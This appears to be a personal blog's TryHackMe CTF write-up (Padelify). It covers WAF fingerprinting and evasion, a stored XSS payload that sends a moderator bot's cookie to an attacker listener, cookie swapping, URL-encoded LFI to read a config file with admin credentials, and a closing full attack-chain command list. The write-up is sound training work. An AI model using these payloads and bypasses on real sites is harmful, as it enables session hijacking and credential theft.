@@ -1,0 +1,521 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Padelify | Jenn Shagrin</title>
+<meta name="keywords" content="">
+<meta name="description" content="TryHackMe CTF — WAF fingerprinting, stored XSS cookie theft to moderator, URL-encoded LFI bypass to exfiltrate admin credentials, privilege escalation to admin via cookie swap.">
+<meta name="author" content="">
+<link rel="canonical" href="https://jennshaggy.github.io/padelify.html">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.086cbe158e48a4a74f4fec1e99aa846e3b43c1f4abb8e972f3ad8921f1408291.css" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jennshaggy.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jennshaggy.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jennshaggy.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+            .list {
+                background: var(--theme);
+            }
+            .toc {
+                background: var(--entry);
+            }
+        }
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/extended/harmonize.css">
+<meta property="og:url" content="https://jennshaggy.github.io/padelify.html">
+<meta property="og:site_name" content="Jenn Shagrin">
+<meta property="og:title" content="Padelify">
+<meta property="og:description" content="TryHackMe CTF — WAF fingerprinting, stored XSS cookie theft to moderator, URL-encoded LFI bypass to exfiltrate admin credentials, privilege escalation to admin via cookie swap.">
+<meta property="og:locale" content="en-us">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Padelify">
+<meta name="twitter:description" content="TryHackMe CTF — WAF fingerprinting, stored XSS cookie theft to moderator, URL-encoded LFI bypass to exfiltrate admin credentials, privilege escalation to admin via cookie swap.">
+</head>
+
+<body id="top">
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jennshaggy.github.io/" accesskey="h" title="Jenn Shagrin (Alt + H)">Jenn Shagrin</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="/security-defense/" title="Security &amp; Defense">
+                    <span>Security &amp; Defense</span>
+                </a>
+            </li>
+            <li>
+                <a href="/networking.html" title="Networking">
+                    <span>Networking</span>
+                </a>
+            </li>
+            <li>
+                <a href="/systems-foundation.html" title="Systems">
+                    <span>Systems</span>
+                </a>
+            </li>
+            <li>
+                <a href="/applied-projects.html" title="Penetration Testing">
+                    <span class="active">Penetration Testing</span>
+                </a>
+            </li>
+            <li>
+                <a href="/platforms-training.html" title="Training">
+                    <span>Training</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://iad.portfolio.instructure.com/shared/4c4c330d1376bf479a9cbb73190bad1a110fb33cf436c283" title="CIAT Portfolio" target="_blank" rel="noopener noreferrer">
+                    <span>CIAT Portfolio</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+
+<main class="main">
+<article class="post-single">
+  <header class="post-header">
+    <h1 class="post-title entry-hint-parent">Padelify</h1>
+    <div class="post-description">TryHackMe CTF. A firewall-hardened web app hides its secrets behind a WAF, a moderator bot, and URL-encoded config files. None of it holds.</div>
+  </header>
+
+  <div class="post-content">
+
+<p>Not starting with Nmap. This challenge lands at the end of a heavy firewall exploitation series, so we kick things off with a <code>curl</code>:</p>
+
+<pre><code>┌──(jenn㉿local)-[~]
+└─$ curl -I 10.145.143.71</code></pre>
+
+<img src="/images/padelify/Screenshot 2026-05-17 at 1.42.01 PM.png" alt="curl -I returning 403 with Apache/2.4.58 and ETag b38" style="max-width:100%;margin:2rem 0;">
+
+<p>The 403 is a strong firewall indicator. Server is <code>Apache/2.4.58</code>. The <code>ETag</code> starting with <code>b38</code> tells us it is either an <code>nginx</code> or <code>AWS</code> firewall. <code>b38</code> is also hexadecimal for <code>2872</code>, which matches the <code>Content-Length</code>. Classic web firewall.</p>
+
+<p>Next, two Nmap scans:</p>
+
+<pre><code>┌──(jenn㉿local)-[~]
+└─$ nmap -sS -Pn -sC -sV -T4 -A 10.145.143.71</code></pre>
+
+<pre><code>┌──(jenn㉿local)-[~]
+└─$ nmap -sS -Pn -sC -sV --script=vuln -T4 -A 10.145.143.71</code></pre>
+
+<p>Key findings from the vuln scan:</p>
+
+<img src="/images/padelify/Screenshot 2026-05-17 at 1.52.29 PM.png" alt="nmap vuln scan output showing open ports and directory findings" style="max-width:100%;margin:2rem 0;">
+
+<img src="/images/padelify/Screenshot 2026-05-17 at 1.52.56 PM.png" alt="nmap vuln scan continued showing PHPSESSID httponly flag not set" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>Open Ports:</strong></p>
+<ul>
+<li>Port 22</li>
+<li>Port 80</li>
+</ul>
+
+<p><strong>Key Findings:</strong></p>
+<ul>
+<li><code>PHPSESSID: httponly flag not set</code> on both the TLD and <code>/login.php</code>: cookie thievery is an option</li>
+<li>Directories discovered: <code>/register.php</code>, <code>/index.php</code>, <code>/login.php</code>, <code>/logs</code>, <code>/config</code>, <code>/css</code>, <code>/js</code></li>
+</ul>
+
+<p>Let&rsquo;s fingerprint this firewall with <code>wafw00f</code>:</p>
+
+<pre><code>┌──(jenn㉿local)-[~]
+└─$ wafw00f http://10.145.143.71</code></pre>
+
+<img src="/images/padelify/Screenshot 2026-05-17 at 2.03.01 PM.png" alt="wafw00f output confirming WAF presence" style="max-width:100%;margin:2rem 0;">
+
+<p>Good boy, <code>wafw00f</code>.<br>
+WAF status = beyond confirmed.</p>
+
+<p>Thanks to this heavy-hitter of a firewall, we are not getting many details. Before we fully dive in, let&rsquo;s put on a disguise and see if we can get less guarded information:</p>
+
+<pre><code>┌──(jenn㉿local)-[~]
+└─$ curl -s -H "User-Agent: Mozilla/5.0" http://10.145.143.71</code></pre>
+
+<img src="/images/padelify/Screenshot 2026-05-17 at 2.14.52 PM.png" alt="curl with Mozilla user agent returning HTML source part 1" style="max-width:100%;margin:2rem 0;">
+
+<img src="/images/padelify/Screenshot 2026-05-17 at 2.15.18 PM.png" alt="curl with Mozilla user agent HTML source part 2 showing registration form" style="max-width:100%;margin:2rem 0;">
+
+<p>All signs are starting to point to XSS as the initial exploit. Let&rsquo;s visit the site in-browser.</p>
+
+<img src="/images/padelify/Screenshot 2026-05-17 at 1.44.37 PM.png" alt="site in browser showing landing page with registration link" style="max-width:100%;margin:2rem 0;">
+
+<p>As promised, there&rsquo;s a form at <code>/register.php</code>. Let&rsquo;s make an account and catch the request in Burp.</p>
+
+<img src="/images/padelify/Screenshot 2026-05-17 at 2.18.48 PM.png" alt="register.php form in browser" style="max-width:100%;margin:2rem 0;">
+
+<p>Registration crafted. FoxyProxy set to Burp, Intercept on. I&rsquo;ll go ahead and click Submit:</p>
+
+<img src="/images/padelify/Screenshot 2026-05-17 at 2.20.53 PM.png" alt="Burp intercept of registration POST request showing plaintext password" style="max-width:100%;margin:2rem 0;">
+
+<p>First: passwords are captured in plaintext (hence, the redacting).</p>
+
+<p>Second: we are dealing with a moderator bot.</p>
+
+<img src="/images/padelify/Screenshot 2026-05-17 at 2.22.05 PM.png" alt="response confirming a moderator bot reviews registrations" style="max-width:100%;margin:2rem 0;">
+
+<p>Excellent news.</p>
+
+<hr>
+
+<h2>Stored XSS</h2>
+
+<p>If the hunch is correct, we can craft an XSS payload that the moderator bot will pick up when it &ldquo;reviews&rdquo; the registration request. We may need to do some recon on what rules control the firewall first. Case sensitivity, whitespace deobfuscation, template bypass. We will find out.</p>
+
+<p>Set up a Python listener:</p>
+
+<pre><code>┌──(jenn㉿local)-[~]
+└─$ python3 -m http.server 8888</code></pre>
+
+<p>First payload attempt, bypassing the firewall via mixed-case letters and whitespace deobfuscation:</p>
+
+<pre><code>&lt;body onload="new Image().src='http://192.168.128.19:8888?c='+document['cOOkiE'];"&gt;</code></pre>
+
+<img src="/images/padelify/Screenshot 2026-05-17 at 2.32.13 PM.png" alt="Python listener catching the first XSS payload hit" style="max-width:100%;margin:2rem 0;">
+
+<p>The listener caught it, but the approach was a little too rogue. The good news: the bot will 100% pick up the message.</p>
+
+<img src="/images/padelify/Screenshot 2026-05-17 at 2.32.48 PM.png" alt="listener output showing the bot response with partial cookie data" style="max-width:100%;margin:2rem 0;">
+
+<p>Tone the string concatenation down a bit:</p>
+
+<pre><code>&lt;body onload="new Image().src='http://192.168.128.19:8888?c='+document['coo' + 'kie'];"&gt;</code></pre>
+
+<p>Nailed it.</p>
+
+<img src="/images/padelify/Screenshot 2026-05-17 at 2.37.32 PM.png" alt="listener capturing full stolen cookie from moderator bot" style="max-width:100%;margin:2rem 0;">
+
+<p>With the <code>httponly flag</code> not set, we take the stolen cookie and swap it out:</p>
+
+<p>Inspect Site &gt; Storage Tab &gt; replace the &ldquo;Value&rdquo; with the stolen cookie &gt; reload.</p>
+
+<img src="/images/padelify/Screenshot 2026-05-17 at 2.40.27 PM.png" alt="DevTools Storage tab with cookie value being replaced by stolen moderator cookie" style="max-width:100%;margin:2rem 0;">
+
+<p>I&rsquo;ll call you Harold because my name is &ldquo;MOD.&rdquo;</p>
+
+<p>I am sure very few will get that joke, but for the few that do, you are my people.</p>
+
+<img src="/images/padelify/Screenshot 2026-05-17 at 2.41.19 PM.png" alt="logged in as moderator after cookie swap" style="max-width:100%;margin:2rem 0;">
+
+<p>Mod password updated for persistence.</p>
+
+<img src="/images/padelify/Screenshot 2026-05-17 at 2.43.17 PM.png" alt="moderator dashboard showing password update confirmation" style="max-width:100%;margin:2rem 0;">
+
+<hr>
+
+<h2>Escalation to Admin</h2>
+
+<p>Now we need to climb up one level to admin. Well, fairly certain it is one level. Assumptions can be dangerous.</p>
+
+<p>From initial enumeration, the most promising remaining directories are <code>/config</code> and <code>/logs</code>. To enumerate further without getting firewalled, we put the Mozilla disguise back on:</p>
+
+<pre><code>┌──(jenn㉿local)-[~]
+└─$ gobuster dir -u http://10.145.143.71/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
+  -a "Mozilla/5.0" -x php,txt,conf,log -t 50</code></pre>
+
+<p>That <code>-a</code> flag is critical to evade the firewall.</p>
+
+<p>While <code>gobuster</code> runs, something stands out: <code>App.conf</code> has the same byte size as the <code>ETag</code> from our initial <code>curl</code>.</p>
+
+<img src="/images/padelify/Screenshot 2026-05-17 at 3.00.07 PM.png" alt="gobuster output showing App.conf with byte size matching ETag from initial curl" style="max-width:100%;margin:2rem 0;">
+
+<p>Let&rsquo;s personally thank my trauma for bringing attention to the tiniest details.</p>
+
+<p>ETag values frequently correspond to inode number or file size depending on the server config. With the identical byte size, it is very likely that <code>App.conf</code> is the file served at the root in the initial <code>curl</code>. In other words: the web root may have been referencing or serving <code>App.conf</code>, which could contain credentials, firewall rules, or other delightful config data.</p>
+
+<p>Let&rsquo;s <code>curl</code> again, in disguise:</p>
+
+<pre><code>┌──(jenn㉿local)-[~]
+└─$ curl -A "Mozilla/5.0" http://10.145.143.71/config/App.conf</code></pre>
+
+<p>Ummm&hellip;.</p>
+
+<img src="/images/padelify/Screenshot 2026-05-17 at 3.09.01 PM.png" alt="curl on App.conf returning 403 blocked by WAF part 1" style="max-width:100%;margin:2rem 0;">
+
+<img src="/images/padelify/Screenshot 2026-05-17 at 3.09.17 PM.png" alt="curl on App.conf blocked by WAF part 2" style="max-width:100%;margin:2rem 0;">
+
+<p>Blocked. It is like when there is a note next to a button that says &ldquo;Don&rsquo;t push the button.&rdquo;</p>
+
+<p>I am going to push the darn button.</p>
+
+<p>Running <code>gobuster</code> directly on <code>/config/</code> to get a more detailed map:</p>
+
+<pre><code>┌──(jenn㉿local)-[~]
+└─$ gobuster dir -u http://10.145.143.71/config/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
+  -a "Mozilla/5.0" -x php,txt,conf,log -t 50</code></pre>
+
+<p>The firewall is universally blocking <code>.conf</code> files, as evidenced by the <code>2872</code> bytes matching the initial <code>curl -I</code>.</p>
+
+<img src="/images/padelify/Screenshot 2026-05-17 at 3.31.24 PM.png" alt="gobuster on /config/ showing all .conf requests returning 403 with 2872 bytes" style="max-width:100%;margin:2rem 0;">
+
+<p>Let&rsquo;s take more of an interest in <code>/logs</code>:</p>
+
+<pre><code>curl -A "Mozilla/5.0" http://10.145.143.71/logs/</code></pre>
+
+<p>This already feels like a path of least resistance.</p>
+
+<img src="/images/padelify/Screenshot 2026-05-17 at 3.33.44 PM.png" alt="curl on /logs/ returning directory listing with error.log" style="max-width:100%;margin:2rem 0;">
+
+<pre><code>curl -A "Mozilla/5.0" http://10.145.143.71/logs/error.log</code></pre>
+
+<img src="/images/padelify/Screenshot 2026-05-17 at 3.36.24 PM.png" alt="curl on error.log returning Apache error log contents" style="max-width:100%;margin:2rem 0;">
+
+<p>Aha! Let me zoom in for you&hellip;</p>
+
+<img src="/images/padelify/Screenshot 2026-05-17 at 3.37.20 PM.png" alt="zoomed error.log showing admin_info path and ModSecurity WAF blocking .conf files" style="max-width:100%;margin:2rem 0;">
+
+<p>We just found where <code>admin_info</code> lives. Also found: the WAF is ModSecurity, blocking <code>.conf</code> files and flagging encoded payloads.</p>
+
+<p>Time for full-metal Jenn.</p>
+
+<p>Direct path attempt, double slash:</p>
+
+<pre><code>curl -A "Mozilla/5.0" http://10.145.143.71//config/app.conf</code></pre>
+
+<p>Blocked. Escalating through encoding.</p>
+
+<p>Single encoding:</p>
+
+<pre><code>curl -A "Mozilla/5.0" http://10.145.143.71/%63%6f%6e%66%69%67%2f%61%70%70%2e%63%6f%6e%66</code></pre>
+
+<p>Double encoding:</p>
+
+<pre><code>curl -A "Mozilla/5.0" http://10.145.143.71/%2563%256f%256e%2566%2569%2567%252f%2561%2570%2570%252e%2563%256f%256e%2566</code></pre>
+
+<p>Every single character double encoded:</p>
+
+<pre><code>curl -A "Mozilla/5.0" http://10.145.143.71/%25%36%33%25%36%66%25%36%65%25%36%36%25%36%39%25%36%37%25%32%66%25%36%31%25%37%30%25%37%30%25%32%65%25%36%33%25%36%66%25%36%65%25%36%36</code></pre>
+
+<p>I am now unleashed. Add in the mod session cookie:</p>
+
+<pre><code>curl -s "http://10.145.143.71/live.php?page=%63%6f%6e%66%69%67%2f%61%70%70%2e%63%6f%6e%66" \
+  -H "User-Agent: Mozilla/5.0" \
+  -H "Cookie: PHPSESSID=eoi7i7ne0p4qi39l2aqumt16b9e"</code></pre>
+
+<img src="/images/padelify/Screenshot 2026-05-17 at 4.00.35 PM.png" alt="LFI via live.php with URL-encoded path returning config file contents" style="max-width:100%;margin:2rem 0;">
+
+<p>HA!</p>
+
+<img src="/images/padelify/Screenshot 2026-05-17 at 4.01.00 PM.png" alt="App.conf contents showing admin credentials in plaintext" style="max-width:100%;margin:2rem 0;">
+
+<p>Log in as admin:</p>
+
+<pre><code>curl -s -X POST "http://10.145.143.71/login.php" \
+  -H "User-Agent: Mozilla/5.0" \
+  -d "username=admin&amp;password=bL}8,S9W1o44" \
+  -c /tmp/admin.txt</code></pre>
+
+<pre><code>cat /tmp/admin.txt</code></pre>
+
+<img src="/images/padelify/Screenshot 2026-05-17 at 4.02.46 PM.png" alt="curl POST to login.php as admin saving session cookie to /tmp/admin.txt" style="max-width:100%;margin:2rem 0;">
+
+<p>Repeat the cookie swap process with admin&rsquo;s session cookie.</p>
+
+<p>Dev Tools &gt; Storage Tab &gt; swap cookies (that sounds so bad when I say it in my head&hellip;).</p>
+
+<img src="/images/padelify/Screenshot 2026-05-17 at 4.04.43 PM.png" alt="DevTools Storage tab with admin session cookie being swapped in" style="max-width:100%;margin:2rem 0;">
+
+<p>Hit refresh. It logged out immediately after the swap. (In Mortal Kombat): &ldquo;FINISH HIM&rdquo;</p>
+
+<pre><code>┌──(jenn㉿local)-[~]
+└─$ curl -s "http://10.145.143.71/dashboard.php" \
+  -H "User-Agent: Mozilla/5.0" \
+  -H "Cookie: PHPSESSID=fu13sm4ahhflf7hhcvu2933fe8"</code></pre>
+
+<img src="/images/padelify/Screenshot 2026-05-17 at 4.09.45 PM.png" alt="dashboard.php response showing moderator and admin flags" style="max-width:100%;margin:2rem 0;">
+
+<p>Moderator flag: <code>THM{Logged_1n_Moderat0r}</code></p>
+<p>Admin flag: <code>THM{Logged_1n_Adm1n001}</code></p>
+
+<hr>
+
+<h2>Full Attack Chain</h2>
+
+<pre><code># Initial recon
+curl -I 10.145.143.71
+nmap -sS -Pn -sC -sV -T4 -A 10.145.143.71
+nmap -sS -Pn -sC -sV --script=vuln -T4 -A 10.145.143.71
+wafw00f http://10.145.143.71
+
+# Disguised enumeration
+curl -s -H "User-Agent: Mozilla/5.0" http://10.145.143.71
+gobuster dir -u http://10.145.143.71/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
+  -a "Mozilla/5.0" -x php,txt,conf,log -t 50
+
+# Stored XSS -- cookie theft via split string concatenation
+# Python listener
+python3 -m http.server 8888
+# Payload injected via registration form:
+# &lt;body onload="new Image().src='http://ATTACKER_IP:8888?c='+document['coo' + 'kie'];"&gt;
+
+# Swap stolen cookie in DevTools &gt; Storage tab
+
+# Persistence -- change mod password via dashboard
+
+# Directory enumeration under /config/
+gobuster dir -u http://10.145.143.71/config/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
+  -a "Mozilla/5.0" -x php,txt,conf,log -t 50
+
+# Log disclosure
+curl -A "Mozilla/5.0" http://10.145.143.71/logs/
+curl -A "Mozilla/5.0" http://10.145.143.71/logs/error.log
+
+# LFI via live.php with URL-encoded path + mod session cookie
+curl -s "http://10.145.143.71/live.php?page=%63%6f%6e%66%69%67%2f%61%70%70%2e%63%6f%6e%66" \
+  -H "User-Agent: Mozilla/5.0" \
+  -H "Cookie: PHPSESSID=MOD_SESSION_ID"
+
+# Admin login
+curl -s -X POST "http://10.145.143.71/login.php" \
+  -H "User-Agent: Mozilla/5.0" \
+  -d "username=admin&amp;password=bL}8,S9W1o44" \
+  -c /tmp/admin.txt
+
+# Access dashboard with admin session cookie
+curl -s "http://10.145.143.71/dashboard.php" \
+  -H "User-Agent: Mozilla/5.0" \
+  -H "Cookie: PHPSESSID=ADMIN_SESSION_ID"</code></pre>
+
+  </div>
+  <footer class="post-footer"></footer>
+</article>
+</main>
+
+<footer class="footer">
+    <span>&copy; 2026 <a href="https://jennshaggy.github.io/">Jenn Shagrin</a></span> ·
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp;
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({ behavior: "smooth" });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+</script>
+</body>
+</html>
